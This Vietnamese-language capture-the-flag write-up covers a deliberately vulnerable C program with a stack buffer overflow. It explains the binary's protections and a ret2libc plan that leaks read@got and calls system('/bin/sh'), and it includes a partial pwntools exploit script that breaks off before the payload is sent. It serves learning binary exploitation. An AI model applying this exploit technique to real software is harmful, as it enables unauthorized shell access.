* Mã C : 
```sh 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
 Analysis
  -
 *  Ta kiểm tra các cơ chế bảo vệ 
     + <img width="466" height="76" alt="Screenshot 2026-11-09 091759" src="https://github.com/user-attachments/assets/70b5311a-beca-43c4-a99f-03274d1754a3" />
     + Ta thấy `NX` được bật nên shellcode được viết vào bộ đệm sẽ không thực thi trực tiếp được
     + ko có canary nên có thể ghi đè thẳng vào địa chỉ trả về
     + ko có PIE nên cac dịa chỉ  của hàm hàm và các gadget bên trong tệp nhị phân đều cố định
     + Thư viện `libc` được nạp ở 1 vị trí khác nhau sau mỗi lần chạy do cơ chế của ASLR vì thế địa chỉ của hàm `system` ko cố định mà ta phải tìm địa chỉ thực tế của 1 hàm trong libc trước
 
  * ```
    int main(int argc, char *argv[]) {
    char buf[0x40] = {};
    initialize();
    ```
   + Cấp phát 1 mảng kí tự `buf` trên stack với kích thước là `0x40` byte và khởi tạo toàn bộ bằng `0`(`{}`)
 - ```
    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));
    return 0;
    }
   ```
   + hàm `read(0, buf, 0x400)`: (`0`-stdin)_(`buf`-Nơi chứa giữ liệu)_(`0x400`-Số lượng byte tối đa cho phép đọc)
   + hàm `write(1, buf, sizeof(buf))` : (`1`-stdout)_(`buf`-dữ liệu từ buf)_(`sizeof(buf)`-kích thước được in ra giới hạn an toàn đúng bằng số byte cấp phát cho `buf`)

-> Ta thấy mảng `buf` chỉ có 0x40 byte nhưng chương trình lại cho nhập lên đến 0x400 byte từ đó sinh ra lỗi tràn bộ đệm ngăm xếp, phần dữ liệu thừa sẽ bị tràn khỏi `buf` và ghi đè lên các địa chỉ quan trọng khác như : return address, save RBP 

 * B1: Ta cần leak địa chỉ của hàm `read()`
   - Chương trình đã gọi hàm `read()` trong quá trình nhận dữ liệu đầu vào nên `read@got` đanh lưu giữ địa chỉ thực tế của hàm `read()` bên trong `libc`
   - Mục tiêu đầu tiên là gọi hàm `write()` để in ra 4 byte lưu tại `read@got` `write (1, read@got, 4);`
 * B2: Tính toán cơ sở libc và gọi system()
   - Khi chuỗi rop đầu tiên trả về `main()` chương trình sẽ chờ dữ liệu đầu vào mới tại lời gọi hàm `read()` lần thứ 2, ta sẽ sử dụng địa chỉ thực tế của hàm `read()` được in ra được từ lượt 1 để tính các địa chỉ cần thiết cho payload thứ 2
   - ```sh
      1  libc base         = leaked read address - read offset in libc
      2  system address    = libc base + system offset in libc
      3  exit address      = libc base + exit offset in libc
      4  "/bin/sh" address = libc base + "/bin/sh" offset in libc
     ```
   - Khi hàm `system()` bắt đầu, `[esp]` chứa địa chỉ của `exit()` để quay về sau khi hoàn tất, và `[esp + 4]` chứa địa chỉ  của `"/bin/sh"`là tham số đầu tiên, nên hàm `system("/bin/sh")` được gọi và sau khi thực thi kết thúc, chương trình sẽ nhảy đến `exit()`

Exploi
 -
 - Tìm kiếm các địa chỉ và các gadget cần thiết 
```sh
  write_plt = e.plt[ "write" ]    # Lấy địa chỉ của write trong file thực thi
  read_got = e.got[ "read"]       # Lấy địa chỉ thực tế của hàm read trong ô nhớ `read@got`
  main = e.symbols[ "main" ]      # Láy địa chỉ bắt đầu của hàm `main()`, dùng để cho chương trình chạy lại hàm main lần 2

  # Tra cứu bảng kí hiệu áp dụng trên libc để tính toán các offset cần thiết 
  read_offset = libc.symbols[ "read" ]
  system_offset = libc.symbols[ "system" ]
  exit_offset = libc.symbols[ "exit" ]
  binsh_offset = next (libc.search( b"/bin/sh" )) #TÌm offset của chuỗi /bin/sh trong libc để làm tham số đầu vào cho `system()`

  cleanup_gadget = rop.find_gadget(
    [ "pop esi" , "pop edi" , "pop ebp" , "ret" ]  #Dọn dẹp stack, sau khi hàm write thực hiện lệnh ret thì con trỏ ngăn xếp `esp` sẽ trỏ ngay vào vị trí của tham số đầu tiên(`1`)
  ).address
```
